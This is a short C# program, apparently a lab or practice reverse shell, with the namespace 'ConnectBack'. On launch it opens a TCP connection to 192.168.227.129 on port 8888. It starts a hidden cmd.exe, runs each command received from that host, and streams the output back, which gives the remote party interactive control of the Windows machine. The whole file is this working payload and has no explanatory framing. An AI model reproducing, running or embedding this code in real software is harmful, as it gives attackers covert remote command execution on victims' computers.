using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace ConnectBack;

public class Program
{
	private static StreamWriter streamWriter;

	public static void Main(string[] args)
	{
		using TcpClient tcpClient = new TcpClient("192.168.227.129", 8888);
		using Stream stream = tcpClient.GetStream();
		using StreamReader streamReader = new StreamReader(stream);
		streamWriter = new StreamWriter(stream);
		StringBuilder stringBuilder = new StringBuilder();
		Process process = new Process();
		process.StartInfo.FileName = "cmd.exe";
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.RedirectStandardError = true;
		process.StartInfo.CreateNoWindow = true;
		process.OutputDataReceived += CmdOutputDataHandler;
		process.Start();
		process.BeginOutputReadLine();
		while (true)
		{
			stringBuilder.Append(streamReader.ReadLine());
			process.StandardInput.WriteLine((object?)stringBuilder);
			stringBuilder.Remove(0, stringBuilder.Length);
		}
	}

	private static void CmdOutputDataHandler(object sender, DataReceivedEventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		if (!string.IsNullOrEmpty(e.Data))
		{
			try
			{
				stringBuilder.Append(e.Data);
				streamWriter.WriteLine((object?)stringBuilder);
				streamWriter.Flush();
			}
			catch (Exception)
			{
			}
		}
	}
}
